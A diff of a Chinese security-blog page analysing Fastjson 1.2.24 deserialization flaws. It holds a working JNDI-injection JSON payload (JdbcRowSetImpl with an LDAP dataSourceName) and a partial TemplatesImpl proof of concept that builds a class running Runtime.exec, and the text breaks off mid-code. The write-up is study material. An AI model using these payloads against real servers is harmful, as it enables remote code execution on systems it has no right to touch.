@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Fastjson fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。 序列化与反序'>
-<title>Fastjson</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Java知名依赖fastjson相关漏洞的分析学习'>
+<title>[Java安全] Fastjson的反序列化</title>
 
 <link rel='canonical' href='https://blog.huamang.xyz/post/fastjson/'>
 
-<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='Fastjson'>
-<meta property='og:description' content='Fastjson fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。 序列化与反序'>
+<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='[Java安全] Fastjson的反序列化'>
+<meta property='og:description' content='Java知名依赖fastjson相关漏洞的分析学习'>
 <meta property='og:url' content='https://blog.huamang.xyz/post/fastjson/'>
 <meta property='og:site_name' content='Huamang'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-11-04T12:04:30&#43;08:00'/><meta property='article:modified_time' content='2022-11-04T12:04:30&#43;08:00'/>
-<meta name="twitter:title" content="Fastjson">
-<meta name="twitter:description" content="Fastjson fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。 序列化与反序">
+<meta name="twitter:title" content="[Java安全] Fastjson的反序列化">
+<meta name="twitter:description" content="Java知名依赖fastjson相关漏洞的分析学习">
     </head>
     <body class="
     article-page
@@ -284,11 +284,15 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
+    <li><a href="#前言">前言</a></li>
     <li><a href="#fastjson">Fastjson</a>
       <ol>
         <li><a href="#序列化与反序列化">序列化与反序列化</a></li>
       </ol>
     </li>
+    <li><a href="#jndi注入">JNDI注入</a></li>
+    <li><a href="#templatesimpl">TemplatesImpl</a></li>
+    <li><a href="#后记">后记</a></li>
   </ol>
 </nav>
         </div>
@@ -316,9 +320,13 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/post/fastjson/">Fastjson</a>
+            <a href="/post/fastjson/">[Java安全] Fastjson的反序列化</a>
         </h2>
     
+        
+        <h3 class="article-subtitle">
+            Java知名依赖fastjson相关漏洞的分析学习
+        </h3>
         
     </div>
 
@@ -353,7 +361,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 1 分钟
+                    阅读时长: 11 分钟
                 </time>
             </div>
         
@@ -368,7 +376,11 @@
     <section class="article-content">
     
     
-    <h1 id="fastjson">Fastjson</h1>
+    <h1 id="前言">前言</h1>
+<p>在学习反序列化的时候，我不禁会想，链子就算满天飞，但是可能现实环境就是没有一个允许用户控制的反序列化的点来触发。</p>
+<p>之前学习到的Shiro550是一个很好的点去承载我们的序列化数据，但是假如没有这么一个rememberMe这个功能，那么我们研究了这么久的反序列化就没有用武之地了。</p>
+<p>而现在分析的fastjson，也撑起了Java反序列化的一大阵营</p>
+<h1 id="fastjson">Fastjson</h1>
 <p>fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，<strong>支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean</strong>。</p>
 <h2 id="序列化与反序列化">序列化与反序列化</h2>
 <p>首先了解他的序列化与反序列化，他的使用十分的简单</p>
@@ -380,10 +392,12 @@
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
+</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">//序列化 JavaBean -&gt; JSON
-</span><span class="c1"></span><span class="n">String</span> <span class="n">text</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span> 
+</span><span class="c1"></span><span class="n">String</span> <span class="n">text</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+
 <span class="c1">//反序列化 JSON -&gt; JavaBean
 </span><span class="c1"></span><span class="n">VO</span> <span class="n">vo</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">();</span> <span class="c1">//解析为JSONObject类型或者JSONArray类型
 </span><span class="c1"></span><span class="n">VO</span> <span class="n">vo</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="s">&#34;{...}&#34;</span><span class="o">);</span> <span class="c1">//JSON文本解析成JSONObject类型
@@ -391,6 +405,839 @@
 </span></code></pre></td></tr></table>
 </div>
 </div><p>做个简单演示</p>
+<p>首先是导包，这里选择导入1.2.24版本的fastjson</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependencies&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+<span class="nt">&lt;/dependencies&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>首先创建一个简单的UserBean</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jsontest</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">user</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kt">int</span> <span class="n">age</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="nf">user</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nf">user</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">int</span> <span class="n">age</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">age</span> <span class="o">=</span> <span class="n">age</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;调用了getName&#34;</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;调用了setName&#34;</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getAge</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">age</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAge</span><span class="o">(</span><span class="kt">int</span> <span class="n">age</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">age</span> <span class="o">=</span> <span class="n">age</span><span class="o">;</span>
+    <span class="o">}</span>
+
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="s">&#34;user{&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;name=&#39;&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="sc">&#39;\&#39;&#39;</span> <span class="o">+</span>
+                <span class="s">&#34;, age=&#34;</span> <span class="o">+</span> <span class="n">age</span> <span class="o">+</span>
+                <span class="sc">&#39;}&#39;</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>做一个序列化与反序列化的测试</p>
+<p>使用<code>toJSONString</code>把UserBean序列化成json，测试三种反序列化的方法</p>
+<ul>
+<li>JSON.parse(s1)</li>
+<li>JSON.parseObject(s1)</li>
+<li>JSON.parseObject(s1,Object.class)</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jsontest</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">json</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">user</span> <span class="n">user1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">user</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">,</span><span class="n">18</span><span class="o">);</span>
+
+        <span class="c1">//序列化
+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">serializedStr</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">user1</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;serializedStr=&#34;</span><span class="o">+</span><span class="n">serializedStr</span><span class="o">);</span>
+
+        <span class="c1">//通过parse方法进行反序列化，返回的是一个JSONObject
+</span><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;-----------------------------------------------------&#34;</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">obj1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">serializedStr</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parse反序列化对象名称:&#34;</span><span class="o">+</span><span class="n">obj1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parse反序列化：&#34;</span><span class="o">+</span><span class="n">obj1</span><span class="o">);</span>
+
+        <span class="c1">//通过parseObject,不指定类，返回的是一个JSONObject
+</span><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;-----------------------------------------------------&#34;</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">obj2</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">serializedStr</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parseObject反序列化对象名称:&#34;</span><span class="o">+</span><span class="n">obj2</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parseObject反序列化:&#34;</span><span class="o">+</span><span class="n">obj2</span><span class="o">);</span>
+
+        <span class="c1">//通过parseObject,指定类后返回的是一个相应的类对象
+</span><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;-----------------------------------------------------&#34;</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">obj3</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">serializedStr</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parseObject反序列化对象名称:&#34;</span><span class="o">+</span><span class="n">obj3</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parseObject反序列化:&#34;</span><span class="o">+</span><span class="n">obj3</span><span class="o">);</span>
+
+
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>运行结果</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221108112537463.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221108112537463"
+	
+	
+></p>
+<p>可以发现：</p>
+<ul>
+<li><code>parse(&quot;&quot;)</code> 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
+<li><code>parseObject(&quot;&quot;)</code> 会调用反序列化目标类的特定 setter 和 getter 方法（此处有的博客说是所有setter，个人测试返回String的setter是不行的，此处打个问号）</li>
+<li><code>parseObject(&quot;&quot;,class)</code> 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
+</ul>
+<p>再测试一个<code>SerializerFeature.WriteClassName</code>参数</p>
+<p>添加了这个参数的话，会将对象类型一起序列化并且会写入到<code>@type</code>字段中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">String</span> <span class="n">serializedStr</span><span class="o">=</span><span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">user</span><span class="o">,</span><span class="n">SerializerFeature</span><span class="o">.</span><span class="na">WriteClassName</span><span class="o">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以和前面运行的结果进行对比，这里执行<code>parse</code>反序列化对象从JSONObject变成了我们自己编写的user类</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221108232505523.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221108232505523"
+	
+	
+></p>
+<p>所以这里出现了一个很敏感的问题，<code>@type</code>为恶意类时，我们可以通过他的get或set方法去进行一些恶意的操作了</p>
+<p>其中getter自动调用还需要满足以下条件：</p>
+<ul>
+<li>方法名长度大于4</li>
+<li>非静态方法</li>
+<li>以get开头且第四个字母为大写</li>
+<li>无参数传入</li>
+<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
+</ul>
+<p>setter自动调用需要满足以下条件：</p>
+<ul>
+<li>方法名长度大于4</li>
+<li>非静态方法</li>
+<li>返回值为void或者当前类</li>
+<li>以set开头且第四个字母为大写</li>
+<li>参数个数为1个</li>
+</ul>
+<p>除此之外Fastjson还有以下功能点：</p>
+<ol>
+<li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li>
+<li>fastjson 在为类属性寻找getter/setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</li>
+<li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li>
+</ol>
+<p>下面就开始分析fastjson的安全相关的东西了，对于fastjson的攻击，这里有两个方式：</p>
+<ul>
+<li>TemplatesImpl</li>
+<li>JNDI注入利用链</li>
+</ul>
+<h1 id="jndi注入">JNDI注入</h1>
+<p>JNDI注入利用链是通用性最强的利用方式，在以下三种反序列化中均可使用：</p>
+<p>但是注意他对jdk有特殊的版本要求：jdk1.8.0_161 &lt; 1.8u191</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">parse</span><span class="o">(</span><span class="n">jsonStr</span><span class="o">)</span>
+<span class="n">parseObject</span><span class="o">(</span><span class="n">jsonStr</span><span class="o">)</span>
+<span class="n">parseObject</span><span class="o">(</span><span class="n">jsonStr</span><span class="o">,</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里JNDI注入利用到的是<code>JdbcRowSetImpl</code>，我们跟进进行分析，我们在这个类里面全局搜索一下<code>lookup</code>，可以发现在connet方法中进行了调用，参数从成员变量 <code>dataSource</code> 中获取</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221109133101984.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221109133101984"
+	
+	
+></p>
+<p>再去找一个setXxxx能到达这里的，在<code>setAutoCommit</code>中发现了是调用了<code>this.connect()</code>的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAutoCommit</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">conn</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">conn</span><span class="o">.</span><span class="na">setAutoCommit</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">conn</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">conn</span><span class="o">.</span><span class="na">setAutoCommit</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>那么就可以很简单的构造一个JSON序列化数据了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+    <span class="nt">&#34;@type&#34;</span><span class="p">:</span><span class="s2">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span> <span class="err">//调用com.sun.rowset.JdbcRowSetImpl函数中的</span>
+    <span class="nt">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s2">&#34;ldap://127.0.0.1:1389/Exploit&#34;</span><span class="p">,</span> <span class="err">//</span> <span class="err">setdataSourceName函数</span> <span class="err">传入参数</span><span class="nt">&#34;ldap://127.0.0.1:1389/Exploit&#34;</span>
+    <span class="s2">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span> <span class="err">//</span> <span class="err">再调用setAutoCommit函数，传入</span><span class="kc">true</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>本地测试起一个ldap服务，然后发起攻击即可</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221109135725551.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221109135725551"
+	
+	
+></p>
+<p>成功rce</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221109135922996.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221109135922996"
+	
+	
+></p>
+<h1 id="templatesimpl">TemplatesImpl</h1>
+<p>除了JNDI的注入，还可以使用TemplateImpl进行字节码的加载，但是条件比较苛刻</p>
+<ol>
+<li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：
+<code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li>
+<li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li>
+</ol>
+<p>因为payload需要赋值的一些属性为private属性，服务端必须添加特性才回去从json中恢复private属性的数据</p>
+<p>之前分析的TemplateImpl的时候，他利用链的最外层是一个<code>getOutputProperties</code>，但是parse进行自动调用的是setXxxx，那么我们就得想办法去找到一个setXxxx调用，为了搞懂我直接<a class="link" href="https://xz.aliyun.com/t/7027#toc-8"  target="_blank" rel="noopener"
+    >搬了个POC</a>然后调试去跟一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jsontest</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.codec.binary.Base64</span><span class="o">;</span>
+
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">testTemplateimpl</span> <span class="o">{</span>
+
+    <span class="c1">//最终执行payload的类的原始模型
+</span><span class="c1"></span>    <span class="c1">//ps.要payload在static模块中执行的话，原始模型需要用static方式。
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">lala</span><span class="o">{</span>
+
+    <span class="o">}</span>
+    <span class="c1">//返回一个在实例化过程中执行任意代码的恶意类的byte码
+</span><span class="c1"></span>    <span class="c1">//如果对于这部分生成原理不清楚，参考以前的文章
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getevilbyte</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="n">CtClass</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">lala</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+        <span class="c1">//要执行的最终命令
+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&#34;);&#34;</span><span class="o">;</span>
+        <span class="c1">//之前说的静态初始化块和构造方法均可，这边用静态方法
+</span><span class="c1"></span>        <span class="n">cc</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+<span class="c1">//        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
+</span><span class="c1">//        cons.setBody(&#34;{&#34;+cmd+&#34;}&#34;);
+</span><span class="c1">//        cc.addConstructor(cons);
+</span><span class="c1"></span>        <span class="c1">//设置不重复的类名
